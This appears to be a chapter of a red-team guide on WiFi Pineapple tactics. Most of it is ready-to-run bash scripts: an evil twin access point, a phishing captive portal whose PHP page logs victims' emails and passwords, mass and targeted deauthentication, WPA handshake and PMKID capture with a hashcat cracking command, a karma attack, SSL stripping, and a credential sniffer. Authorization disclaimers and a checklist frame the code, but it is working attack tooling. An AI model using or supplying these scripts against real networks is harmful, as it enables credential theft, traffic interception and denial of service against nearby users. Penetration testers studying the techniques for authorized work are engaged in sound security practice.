# WiFi Pineapple Red Team Tactics

## Overview

This guide covers WiFi Pineapple attack techniques for authorized penetration testing and security assessments.

---

## Attack Categories

```
WiFi ATTACK TAXONOMY
├── Reconnaissance
│   ├── Network Discovery
│   ├── Client Enumeration
│   └── Probe Request Collection
├── Access Point Attacks
│   ├── Evil Twin
│   ├── Karma Attack
│   └── Rogue AP
├── Client Attacks
│   ├── Deauthentication
│   ├── Handshake Capture
│   └── PMKID Capture
└── Post-Connection
    ├── MITM
    ├── SSL Stripping
    └── Credential Capture
```

---

## Evil Twin Attack Setup

### Basic Evil Twin Script

```bash
#!/bin/bash
#######################################
# Evil Twin Attack Setup
# For authorized testing only
#######################################

TARGET_SSID="$1"
INTERFACE="${2:-wlan0}"
GATEWAY="${3:-192.168.1.1}"

if [ -z "$TARGET_SSID" ]; then
    echo "Usage: $0 <target_ssid> [interface] [gateway_ip]"
    exit 1
fi

echo "[*] Setting up Evil Twin for: $TARGET_SSID"

# Check for required tools
for tool in hostapd dnsmasq; do
    if ! command -v $tool &>/dev/null; then
        echo "[!] $tool not found. Install with: apt install $tool"
        exit 1
    fi
done

# Create hostapd config
cat > /tmp/hostapd.conf << EOF
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

# Create dnsmasq config
cat > /tmp/dnsmasq.conf << EOF
interface=$INTERFACE
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,$GATEWAY
dhcp-option=6,$GATEWAY
server=8.8.8.8
log-queries
log-dhcp
address=/#/$GATEWAY
EOF

# Setup interface
echo "[*] Configuring interface..."
ip link set $INTERFACE down
ip addr flush dev $INTERFACE
ip addr add $GATEWAY/24 dev $INTERFACE
ip link set $INTERFACE up

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Setup NAT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i $INTERFACE -o eth0 -j ACCEPT

# Start services
echo "[*] Starting Evil Twin..."
dnsmasq -C /tmp/dnsmasq.conf &
hostapd /tmp/hostapd.conf

# Cleanup on exit
cleanup() {
    killall hostapd dnsmasq 2>/dev/null
    iptables -t nat -F
    iptables -F FORWARD
    echo "[*] Cleanup complete"
}
trap cleanup EXIT
```

### Captive Portal Setup

```bash
#!/bin/bash
#######################################
# Captive Portal for Evil Twin
#######################################

PORTAL_DIR="/var/www/captive"
mkdir -p "$PORTAL_DIR"

# Create landing page
cat > "$PORTAL_DIR/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; padding: 50px; }
        .container { max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 10px; }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { width: 100%; padding: 15px; background: #4CAF50; color: white; border: none; cursor: pointer; }
        h2 { text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <h2>WiFi Login Required</h2>
        <form action="/capture" method="POST">
            <input type="text" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
EOF

# Create capture script
cat > "$PORTAL_DIR/capture.php" << 'EOF'
<?php
$email = $_POST['email'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

$log = fopen('/var/log/captive_credentials.log', 'a');
fwrite($log, "$time | $ip | $email | $password\n");
fclose($log);

// Redirect to internet
header('Location: http://www.google.com');
?>
EOF

echo "[+] Captive portal created in: $PORTAL_DIR"
echo "[*] Start with: php -S 0.0.0.0:80 -t $PORTAL_DIR"
```

---

## Deauthentication Attack

### Targeted Deauth Script

```bash
#!/bin/bash
#######################################
# Targeted Deauthentication
# Force client to reconnect to Evil Twin
#######################################

TARGET_BSSID="$1"
CLIENT_MAC="$2"
INTERFACE="${3:-wlan0mon}"

if [ -z "$TARGET_BSSID" ] || [ -z "$CLIENT_MAC" ]; then
    echo "Usage: $0 <target_bssid> <client_mac> [interface]"
    echo "Example: $0 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66"
    exit 1
fi

# Check monitor mode
if ! iwconfig "$INTERFACE" 2>/dev/null | grep -q "Monitor"; then
    echo "[*] Putting interface in monitor mode..."
    airmon-ng start "${INTERFACE%mon}" &>/dev/null
fi

echo "[*] Sending deauth packets..."
echo "[*] Target AP: $TARGET_BSSID"
echo "[*] Target Client: $CLIENT_MAC"
echo "[*] Press Ctrl+C to stop"

# Send deauth frames
aireplay-ng -0 0 -a "$TARGET_BSSID" -c "$CLIENT_MAC" "$INTERFACE"
```

### Mass Deauth for Area Denial

```bash
#!/bin/bash
#######################################
# Area Denial Deauthentication
# Deauth all clients from target AP
# FOR AUTHORIZED TESTING ONLY
#######################################

TARGET_BSSID="$1"
INTERFACE="${2:-wlan0mon}"
DURATION="${3:-60}"

echo "[*] Area denial attack on: $TARGET_BSSID"
echo "[*] Duration: $DURATION seconds"
echo "[*] Press Ctrl+C to stop early"

# Deauth all clients (broadcast)
timeout "$DURATION" aireplay-ng -0 0 -a "$TARGET_BSSID" "$INTERFACE"

echo "[*] Attack complete"
```

---

## WPA Handshake Capture

### Automated Handshake Capture

```bash
#!/bin/bash
#######################################
# WPA Handshake Capture
#######################################

TARGET_BSSID="$1"
TARGET_CHANNEL="$2"
INTERFACE="${3:-wlan0mon}"
OUTPUT_DIR="/tmp/handshakes"

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
    echo "Usage: $0 <bssid> <channel> [interface]"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"
OUTPUT="$OUTPUT_DIR/$(echo $TARGET_BSSID | tr ':' '-')"

echo "[*] Capturing handshake for: $TARGET_BSSID on channel $TARGET_CHANNEL"

# Start capture
airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$OUTPUT" "$INTERFACE" &
CAPTURE_PID=$!

sleep 5

# Send deauth to speed up capture
echo "[*] Sending deauth to capture handshake..."
aireplay-ng -0 5 -a "$TARGET_BSSID" "$INTERFACE" &>/dev/null &

# Wait for handshake
echo "[*] Waiting for handshake (check airodump output for 'WPA handshake')..."
echo "[*] Press Ctrl+C when handshake captured"

wait $CAPTURE_PID

# Check for handshake
if aircrack-ng "${OUTPUT}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
    echo "[+] Handshake captured: ${OUTPUT}-01.cap"
else
    echo "[-] No handshake in capture"
fi
```

### PMKID Capture (Clientless)

```bash
#!/bin/bash
#######################################
# PMKID Capture (No client needed)
#######################################

TARGET_BSSID="$1"
TARGET_CHANNEL="$2"
INTERFACE="${3:-wlan0mon}"

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
    echo "Usage: $0 <bssid> <channel> [interface]"
    exit 1
fi

OUTPUT="/tmp/pmkid_$(echo $TARGET_BSSID | tr ':' '-')"

echo "[*] Attempting PMKID capture for: $TARGET_BSSID"

# Check for hcxdumptool
if ! command -v hcxdumptool &>/dev/null; then
    echo "[!] hcxdumptool required. Install from: https://github.com/ZerBea/hcxdumptool"
    exit 1
fi

# Set channel
iwconfig "$INTERFACE" channel "$TARGET_CHANNEL"

# Capture PMKID
echo "[*] Listening for PMKID (usually takes 1-5 minutes)..."
timeout 300 hcxdumptool -i "$INTERFACE" -o "${OUTPUT}.pcapng" --filterlist_ap="$TARGET_BSSID" --filtermode=2

# Convert for hashcat
if [ -f "${OUTPUT}.pcapng" ]; then
    hcxpcapngtool -o "${OUTPUT}.22000" "${OUTPUT}.pcapng"
    if [ -f "${OUTPUT}.22000" ]; then
        echo "[+] PMKID captured: ${OUTPUT}.22000"
        echo "[*] Crack with: hashcat -m 22000 ${OUTPUT}.22000 wordlist.txt"
    else
        echo "[-] No PMKID obtained (AP may not support RSN PMKID)"
    fi
fi
```

---

## Karma Attack

### Auto-Associate with Probe Requests

```bash
#!/bin/bash
#######################################
# Karma Attack Setup
# Respond to any SSID probe
#######################################

INTERFACE="${1:-wlan0}"

echo "[*] Starting Karma attack..."
echo "[*] Will respond to ALL probe requests"

# Check for hostapd-mana (karma-capable)
if ! command -v hostapd-mana &>/dev/null; then
    echo "[!] hostapd-mana required for karma attacks"
    echo "[*] Using standard hostapd in open mode instead"

    # Monitor probe requests and create APs dynamically
    echo "[*] Monitoring probe requests..."

    tcpdump -i "$INTERFACE" -e -s 256 type mgt subtype probe-req 2>/dev/null | while read line; do
        SSID=$(echo "$line" | grep -oP 'Probe Request \(\K[^)]+')
        if [ -n "$SSID" ] && [ "$SSID" != "Broadcast" ]; then
            echo "[+] Client probing for: $SSID"
            # Could spawn hostapd for this SSID
        fi
    done
else
    # Use hostapd-mana for true karma
    cat > /tmp/karma.conf << EOF
interface=$INTERFACE
driver=nl80211
ssid=FreeWiFi
channel=6
enable_karma=1
karma_loud=1
EOF

    hostapd-mana /tmp/karma.conf
fi
```

---

## MITM Attack Framework

### SSL Strip Setup

```bash
#!/bin/bash
#######################################
# SSL Strip MITM
# Downgrade HTTPS to HTTP
#######################################

INTERFACE="${1:-wlan0}"
GATEWAY="${2:-192.168.1.1}"

echo "[*] Setting up SSL Strip MITM..."

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Setup iptables redirect
iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --destination-port 443 -j REDIRECT --to-port 10000

# Start sslstrip
if command -v sslstrip &>/dev/null; then
    sslstrip -l 10000 -w /tmp/sslstrip.log &
    echo "[+] SSLStrip running on port 10000"
    echo "[*] Captured credentials will be in /tmp/sslstrip.log"
else
    echo "[!] sslstrip not found"
    echo "[*] Install with: pip install sslstrip"
fi

# Alternative: mitmproxy
if command -v mitmproxy &>/dev/null; then
    echo "[*] Or use: mitmproxy --mode transparent --listen-port 10000"
fi

# Cleanup function
cleanup() {
    iptables -t nat -F PREROUTING
    killall sslstrip 2>/dev/null
    echo "[*] Cleanup complete"
}
trap cleanup EXIT

echo "[*] Press Enter to stop..."
read
```

---

## Post-Exploitation

### Network Credential Sniffer

```bash
#!/bin/bash
#######################################
# Network Credential Sniffer
# Capture cleartext credentials
#######################################

INTERFACE="${1:-wlan0}"
OUTPUT_DIR="/tmp/credentials"

mkdir -p "$OUTPUT_DIR"

echo "[*] Starting credential capture on $INTERFACE..."

# Capture HTTP POST data
tcpdump -i "$INTERFACE" -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' 2>/dev/null | \
    grep -iE "user|pass|login|email" >> "$OUTPUT_DIR/http_creds.txt" &

# Capture FTP credentials
tcpdump -i "$INTERFACE" -A -s 0 'port 21' 2>/dev/null | \
    grep -iE "USER|PASS" >> "$OUTPUT_DIR/ftp_creds.txt" &

# Capture SMTP credentials
tcpdump -i "$INTERFACE" -A -s 0 'port 25 or port 587' 2>/dev/null | \
    grep -iE "AUTH|LOGIN" >> "$OUTPUT_DIR/smtp_creds.txt" &

echo "[+] Capture running"
echo "[*] Output directory: $OUTPUT_DIR"
echo "[*] Press Ctrl+C to stop"

wait
```

---

## Red Team Checklist

```
PRE-ENGAGEMENT:
☐ Written authorization obtained
☐ Scope clearly defined
☐ Target SSIDs identified
☐ Legal constraints reviewed
☐ Emergency contacts documented

RECONNAISSANCE:
☐ Nearby networks enumerated
☐ Target AP characteristics noted
☐ Client devices identified
☐ Security measures assessed

EXECUTION:
☐ Evil Twin deployed
☐ Deauth performed if authorized
☐ Handshakes captured
☐ Credentials collected

POST-ENGAGEMENT:
☐ All artifacts collected
☐ Evidence secured
☐ Systems restored
☐ Report prepared
```

---

[← Back to Chapter 02](../README.md)
